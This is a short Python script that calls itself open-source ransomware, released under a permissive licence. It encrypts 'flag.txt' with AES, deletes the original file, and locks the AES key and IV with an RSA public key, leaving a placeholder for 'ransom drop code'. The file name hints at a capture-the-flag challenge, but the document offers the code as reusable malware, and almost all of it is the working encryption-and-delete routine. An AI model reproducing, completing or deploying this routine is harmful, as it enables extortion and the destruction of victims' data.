# Zecryptor, Open source Ransomware 

"""
Copyright zecryptor 2020
Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
"""

from Cryptodome.PublicKey  import RSA
from Cryptodome.Cipher import AES, PKCS1_v1_5
import os

# Generate AES key
aes_key = os.urandom(16)
aes_iv = os.urandom(16)
aes = AES.new(aes_key, AES.MODE_CBC, aes_iv)
with open("flag.txt", "rb") as f :
    data = f.read()
    padding = (16 - (len(data) % 16)) * b"\xff"
    with open("flag.enc", "wb") as f2 :
        f2.write(aes.encrypt(data + padding))
os.remove("flag.txt")


# Encrypt it with RSA public  key
with open('public.pem', 'rb') as f :
    pub = RSA.importKey(f.read())

cipher = PKCS1_v1_5.new(pub)
key_enc = cipher.encrypt(aes_iv + aes_key)

# save AES encrypted key to config file
with open("config.enc", "wb") as f :
    f.write(key_enc)

# Add your ransom drop code here